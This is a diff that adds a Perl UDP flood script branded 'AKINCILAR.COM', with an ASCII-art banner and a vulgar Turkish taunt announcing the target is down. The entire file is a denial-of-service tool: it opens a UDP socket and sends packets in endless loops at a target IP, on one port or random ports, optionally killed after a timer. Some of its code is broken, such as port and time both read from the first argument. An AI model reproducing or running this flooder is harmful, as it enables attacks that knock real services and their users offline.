@@ -1,0 +1,54 @@
+#!/usr/bin/perl
+use Socket;
+$ARGC=@ARGV;
+my ($ip,$port,$size,$time);
+$ip=$ARGV[0];
+$port=$ARGV[0];
+$time=$ARGV[0];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+$iaddr = inet_aton("$ip");
+
+printf "[1;35m[1;33mAKINCILAR.COM[1;31m UDP FLOOD SCRIPT [0;32m  
+
+ .S_SSSs     .S    S.    .S   .S_sSSs      sSSs   .S  S.       .S_SSSs     .S_sSSs    
+.SS~SSSSS   .SS    SS.  .SS  .SS~YS%%b    d%%SP  .SS  SS.     .SS~SSSSS   .SS~YS%%b   
+S%S   SSSS  S%S    S&S  S%S  S%S   `S%b  d%S'    S%S  S%S     S%S   SSSS  S%S   `S%b  
+S%S    S%S  S%S    d*S  S%S  S%S    S%S  S%S     S%S  S%S     S%S    S%S  S%S    S%S  
+S%S SSSS%S  S&S   .S*S  S&S  S%S    S&S  S&S     S&S  S&S     S%S SSSS%S  S%S    d*S  
+S&S  SSS%S  S&S_sdSSS   S&S  S&S    S&S  S&S     S&S  S&S     S&S  SSS%S  S&S   .S*S  
+S&S    S&S  S&S~YSSY%b  S&S  S&S    S&S  S&S     S&S  S&S     S&S    S&S  S&S_sdSSS   
+S&S    S&S  S&S    `S%  S&S  S&S    S&S  S&S     S&S  S&S     S&S    S&S  S&S~YSY%b   
+S*S    S&S  S*S     S%  S*S  S*S    S*S  S*b     S*S  S*b     S*S    S&S  S*S   `S%b  
+S*S    S*S  S*S     S&  S*S  S*S    S*S  S*S.    S*S  S*S.    S*S    S*S  S*S    S%S  
+S*S    S*S  S*S     S&  S*S  S*S    S*S   SSSbs  S*S   SSSbs  S*S    S*S  S*S    S&S  
+SSS    S*S  S*S     SS  S*S  S*S    SSS    YSSP  S*S    YSSP  SSS    S*S  S*S    SSS  
+       SP   SP          SP   SP                  SP                  SP   SP          
+       Y    Y           Y    Y                   Y                   Y    Y           
+ [1;36m$ipn";  
+printf "[1;35m[1;33m[1;31m[0;32m IP DOWN[0;31m-> IYI SIKISLER ;)[0m\n";  
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &"); 
+goto randpackets;
+}
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=(rand 65000) +1;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
